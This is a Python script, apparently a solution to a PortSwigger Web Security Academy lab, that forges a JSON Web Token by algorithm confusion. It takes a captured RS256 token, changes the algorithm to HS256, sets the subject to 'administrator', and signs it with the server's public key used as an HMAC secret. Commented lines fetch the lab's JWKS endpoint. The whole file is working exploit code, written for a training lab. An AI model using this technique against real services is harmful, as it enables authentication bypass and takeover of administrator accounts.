# JWT authentication bypass via algorithm confusion
import base64
import json
from jwcrypto import jwt, jwk
# import requests

# url = "https://0a6800a204ebe746c04b5b6700940085.web-security-academy.net/jwks.json"

# r = requests.get(url).json()
# pub_jku = r['keys'][0]
# print(json.dumps(pub_jku))
# copy the output > go to Burp > JWT Editor Keys > New Symmetric Key > Paste in Key box > Copy from PEM file and save as pemfile

orig_jwt = "eyJraWQiOiI2YWI3NzFjMC02YjI1LTRiOGQtOGM4NC05NzMwYzczZDUxMGIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2OTcwMjU5OH0.ADW9fns1Wif_JFH8znPgnmoWQ6aB65eQvHbqEgL0Nl_upfYJILqSmdRJnO2HkZdqmDpHCFgaIoWLLjHYabEk0QJU5eLj-0AFefJOcjSck6GKVNV_r3_P5bhFUU3TqmX7LBuYdCpy_R47K938F23VNJLyZ2MlOjqNwm1C33oL1XzQUUGx15LjdDb-_NoDB0J-mU-fzERxyBnggkS1bERBzUnMC_eYlNzY39-VspAxbIKvqKVjc7-HtMpNIVX5Y6le-CAHReuqLcx_Re5wXstaQrlIt67xFK2taMsECTLZgUs45ldpJ-s-AwgQhq7naS7NUtf5DvecTWibZQcxQLK7Mg"
h, p, s = orig_jwt.split('.')

h_json = json.loads(
    base64.urlsafe_b64decode(h + '='*(len(h)//4)).decode()
)
p_json = json.loads(
    base64.urlsafe_b64decode(p + '='*(len(p)//4)).decode()
)

h_json["alg"] = "HS256"
p_json["sub"] = "administrator"

with open('Portswigger/Labs_test_with_python/JWT/lab07.pem', 'rb') as f:
    pub_jku = f.read()


pub_jku_64 = base64.b64encode(pub_jku).decode()
key = jwk.JWK(generate='oct', size=256)
key["k"] = pub_jku_64

Token = jwt.JWT(
    header=json.dumps(h_json),
    claims=json.dumps(p_json)
)
Token.make_signed_token(key)
print(Token.serialize())
